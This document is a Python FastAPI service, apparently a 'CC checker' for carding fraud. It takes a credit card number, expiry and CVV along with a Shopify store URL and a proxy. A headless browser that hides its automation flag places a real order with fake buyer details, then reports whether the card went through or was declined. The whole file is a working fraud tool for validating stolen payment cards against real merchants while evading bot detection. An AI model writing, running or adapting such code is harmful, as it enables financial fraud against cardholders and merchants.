from fastapi import FastAPI, Query
from fastapi.responses import JSONResponse
from playwright.sync_api import sync_playwright
import time
import random
import re
import requests
from urllib.parse import urlparse

app = FastAPI()

def format_proxy(proxy_str):
    if not proxy_str: return None
    proxy_str = proxy_str.replace('http://', '').replace('https://', '')
    parts = proxy_str.split(':')
    if len(parts) == 4: return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    elif len(parts) == 2: return f"http://{parts[0]}:{parts[1]}"
    return f"http://{proxy_str}"

def safe_response(msg, price, gate="Shopify Payments"):
    clean_price = str(price).replace('$', '').strip() if price else "-"
    return {"Response": msg, "Price": clean_price, "Gate": gate}

@app.get("/code/index.php")
def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query(None)):
    try:
        cc_parts = re.findall(r'\d+', cc.replace('|', ' '))
        if len(cc_parts) < 4: return JSONResponse(content=safe_response("Invalid CC Format", "-"))
        cc_num, mm, yy, cvv = cc_parts[0], cc_parts[1], cc_parts[2], cc_parts[3]
        if len(yy) == 2: yy = "20" + yy

        store_url = url.rstrip('/')
        proxy_url = format_proxy(proxy)
        req_proxies = {"http": proxy_url, "https": proxy_url} if proxy_url else None

        fn = random.choice(["Michael", "James", "David", "John", "Robert"])
        ln = random.choice(["Smith", "Johnson", "Williams", "Brown", "Jones"])
        email = f"{fn.lower()}{ln.lower()}{random.randint(100,999)}@gmail.com"
        phone = f"212{random.randint(2000000, 9999999)}"
        address = f"{random.randint(100, 9999)} Broadway"
        full_name = f"{fn} {ln}"

        variant_id, price = None, "-"
        try:
            r = requests.get(f"{store_url}/products.json?limit=250", timeout=10, proxies=req_proxies)
            if r.status_code == 200:
                products = r.json().get('products', [])
                for p in products:
                    for v in p.get('variants', []):
                        if v.get('available') and float(v.get('price', 0)) > 0:
                            variant_id = str(v.get('id'))
                            price = str(v.get('price'))
                            break
                    if variant_id: break
        except Exception as e:
            return JSONResponse(content=safe_response(f"API Fetch failed: {str(e)[:50]}", "-"))

        if not variant_id:
            return JSONResponse(content=safe_response("Product Not Found", "-"))

        with sync_playwright() as p:
            proxy_settings = None
            if proxy_url:
                p_parsed = urlparse(proxy_url)
                proxy_settings = {
                    "server": f"http://{p_parsed.hostname}:{p_parsed.port}",
                    "username": p_parsed.username,
                    "password": p_parsed.password
                }

            browser_args = [
                "--disable-blink-features=AutomationControlled",
                "--disable-infobars",
                "--no-sandbox",
                "--disable-setuid-sandbox",
                "--disable-dev-shm-usage",
                "--disable-web-security"
            ]

            browser = p.chromium.launch(headless=True, args=browser_args, proxy=proxy_settings)
            
            context = browser.new_context(
                viewport={'width': 1280, 'height': 720},
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
            )
            context.add_init_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            
            page = context.new_page()

            # 🔥 التحديث الجبار: منع تحميل الصور والـ CSS لتسريع المتصفح 4 أضعاف
            page.route("**/*", lambda route: route.abort() if route.request.resource_type in ["image", "stylesheet", "font", "media"] else route.continue_())

            try:
                # قللنا أوقات الانتظار لأن الصفحة هتحمل أسرع بكتير
                page.goto(f"{store_url}/cart/add?id={variant_id}&quantity=1", timeout=45000)
                page.goto(f"{store_url}/checkout", timeout=45000, wait_until="domcontentloaded")
                time.sleep(2) 

                page.locator('input[name="email"], input#checkout_email').first.fill(email)
                page.locator('input[name="firstName"], input[name="shippingAddress.firstName"]').first.fill(fn)
                page.locator('input[name="lastName"], input[name="shippingAddress.lastName"]').first.fill(ln)
                page.locator('input[name="address1"], input[name="shippingAddress.address1"]').first.fill(address)
                page.locator('input[name="city"], input[name="shippingAddress.city"]').first.fill("New York")
                
                try: page.locator('select[name="zone"]').select_option(label="New York")
                except: pass
                
                page.locator('input[name="postalCode"], input[name="shippingAddress.zip"]').first.fill("10024")
                page.locator('input[name="phone"], input[name="shippingAddress.phone"]').first.fill(phone)
                time.sleep(0.5)

                try:
                    btn = page.locator('button:has-text("Continue to payment"), button#continue_button')
                    if btn.is_visible():
                        btn.click()
                        time.sleep(2)
                except: pass

                frame_num = page.frame_locator('iframe[name^="card-fields-number"]')
                frame_num.locator('input[name="number"], input[id="number"]').first.fill(cc_num)
                
                frame_exp = page.frame_locator('iframe[name^="card-fields-expiry"]')
                frame_exp.locator('input[name="expiry"], input[id="expiry"]').first.fill(f"{mm}{yy[-2:]}")
                
                frame_cvv = page.frame_locator('iframe[name^="card-fields-verification_value"]')
                frame_cvv.locator('input[name="verification_value"], input[id="verification_value"], input[placeholder="Security code"]').first.fill(cvv)
                
                try:
                    frame_name = page.frame_locator('iframe[name^="card-fields-name"]')
                    if frame_name.locator('input').first.is_visible():
                        frame_name.locator('input[name="name"], input[id="name"]').first.fill(full_name)
                except: pass

                page.locator('button:has-text("Pay now"), button#continue_button, button[id="checkout-pay-button"]').click()
                
                # انتظار الرد
                time.sleep(10)
                
                # 🔥 التحديث الجبار 2: صائد الأخطاء الذكي
                error_locator = page.locator('.notice__text, .field__message, .payment-due__price, p.notice__text, div.notice--error')
                
                page_text = page.content().lower()
                
                if "thank you" in page_text or "order confirmed" in page_text:
                    return JSONResponse(content=safe_response("Order completed 💎", price))
                elif "submitfailed" in page_text or "couldn't be processed" in page_text:
                     return JSONResponse(content=safe_response("Declined: Silent Gateway Rejection 💳", price))
                
                # سحب رسالة الخطأ الحقيقية اللي ظهرت على الشاشة
                if error_locator.first.is_visible():
                    exact_error = error_locator.first.inner_text().strip()
                    if exact_error:
                        return JSONResponse(content=safe_response(f"Declined: {exact_error} 💳", price))

                # لو مفيش خطأ واضح في كلاس معين، هندور بالطريقة العادية
                if "insufficient funds" in page_text or "declined" in page_text or "security code was incorrect" in page_text or "issue processing your payment" in page_text:
                    return JSONResponse(content=safe_response("Declined: CARD_DECLINED 💳", price))
                else:
                    return JSONResponse(content=safe_response("Declined: Bank Rejected / Error Not Found", price))
                    
            except Exception as e:
                return JSONResponse(content=safe_response(f"Browser Flow Error: {str(e)[:50]}", price))
            finally:
                browser.close()

    except Exception as e:
        return JSONResponse(content=safe_response(f"System Error: {str(e)[:50]}", "-"))
